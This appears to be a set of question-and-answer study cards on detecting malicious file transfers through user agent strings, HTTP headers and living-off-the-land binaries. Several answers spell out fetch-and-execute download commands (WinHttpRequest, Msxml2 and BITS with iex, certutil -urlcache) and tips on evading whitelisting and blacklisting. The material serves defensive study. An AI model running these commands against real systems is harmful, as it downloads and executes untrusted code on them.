What is the most robust method for detecting malicious command-line activity? | Whitelisting all command lines in a particular environment, which allows for quick detection and alerting on any unusual command lines
What is a user agent string used for in HTTP? | To identify which HTTP client is connecting to a web server, such as Firefox, Chrome, cURL, Python scripts, or security tools like sqlmap and Nmap
What user agent string does Invoke-WebRequest use by default? | Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
What user agent string does WinHttpRequest use? | Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
What user agent string does Msxml2 use? | Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
What user agent string does Certutil use? | Microsoft-CryptoAPI/10.0
What user agent string does BITS use? | Microsoft BITS/7.8
How can you change the user agent in PowerShell's Invoke-WebRequest? | Use the -UserAgent parameter with predefined agents like [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
What are the five predefined user agents available in PowerShell? | InternetExplorer, FireFox, Chrome, Opera, and Safari
What is a LOLBIN? | A "living off the land binary" or "misplaced trust binary" - legitimate binaries that can be misused for malicious purposes like file transfers
What is an example of a LOLBIN for file downloads? | GfxDownloadWrapper.exe (Intel Graphics Driver for Windows 10) which can download files using: GfxDownloadWrapper.exe "http://url/file.exe" "C:\path\file.exe"
What is the Linux equivalent of the LOLBAS project? | GTFOBins project, which provides information on commonly installed binaries that can be used for file transfers
How many binaries does the GTFOBins project cover for file transfers? | Nearly 40 commonly installed binaries
Why might LOLBINs be effective for evading detection? | They might be permitted to run by application whitelisting and could be excluded from security alerting since they are legitimate system binaries
What HTTP method does BITS use when transferring files? | HEAD method for the initial request
What detection strategy involves building lists of known legitimate user agent strings? | Creating whitelists of legitimate user agents from browsers, OS processes, and update services, then feeding them into SIEM tools to filter out legitimate traffic and focus on anomalies
What are two basic approaches organizations can take to detect malicious file transfers? | Create a whitelist of allowed binaries or create a blacklist of binaries known to be used for malicious purposes
What makes command-line detection based on blacklisting easy to bypass? | Simple case obfuscation can bypass blacklisting-based detection
What PowerShell command is used to list all available user agents? | [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
What is the complete syntax for using Invoke-WebRequest with a custom user agent? | $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome; Invoke-WebRequest http://url/file.exe -UserAgent $UserAgent -OutFile "C:\path\file.exe"
What PowerShell commands can be used with WinHttpRequest for file transfers? | $h=new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET','http://url/file.exe',$false); $h.send(); iex $h.ResponseText
What PowerShell commands can be used with Msxml2 for file transfers? | $h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','http://url/file.exe',$false); $h.send(); iex $h.responseText
What are the two certutil commands that can be used for file transfers? | certutil -urlcache -split -f http://url/file.exe and certutil -verifyctl -split -f http://url/file.exe
What is the complete BITS transfer command sequence in PowerShell? | Import-Module bitstransfer; Start-BitsTransfer 'http://url/file.exe' $env:temp\t; $r=gc $env:temp\t; rm $env:temp\t; iex $r
What HTTP headers does WinHttpRequest send? | Connection: Keep-Alive, Accept: */*, User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
What HTTP headers does Msxml2 send? | Accept: */*, Accept-Language: en-us, UA-CPU: AMD64, Accept-Encoding: gzip, deflate
What HTTP headers does Certutil send? | Cache-Control: no-cache, Connection: Keep-Alive, Pragma: no-cache, Accept: */*
What HTTP headers does BITS send? | Connection: Keep-Alive, Accept: */*, Accept-Encoding: identity
Why is HTTP client-server negotiation important for detection? | Most client-server protocols require negotiation before exchanging information, and this process creates identifiable patterns that can be monitored
What makes user agent analysis effective for threat hunting? | Organizations can filter out legitimate traffic by whitelisting known good user agents, allowing focus on anomalous strings that may indicate suspicious behavior
What additional HTTP headers can help identify Msxml2 requests? | UA-CPU: AMD64 and Accept-Language: en-us are specific to Msxml2 requests
What is the key advantage of using whitelisting over blacklisting for command-line detection? | Whitelisting is very robust and allows for quick detection and alerting, while blacklisting can be easily bypassed with simple obfuscation
What should organizations include in their legitimate user agent whitelist? | Default operating system processes, common update services like Windows Update, antivirus updates, and known legitimate browser user agents
How can application whitelisting be bypassed using LOLBINs? | LOLBINs are legitimate system binaries that may be permitted to run by application whitelisting and excluded from security alerting
What is the purpose of the -split parameter in certutil commands? | The -split parameter is used with certutil to handle file transfers, working with both -urlcache and -verifyctl options
What makes BITS transfers potentially stealthy? | BITS uses HEAD requests initially and has a user agent (Microsoft BITS/7.8) that might be considered legitimate background service traffic
Why might defenders focus on anomalous user agent strings? | Hunting for anomalous user agent strings can be an excellent way to catch an attack in progress since attackers often use tools with distinctive user agents
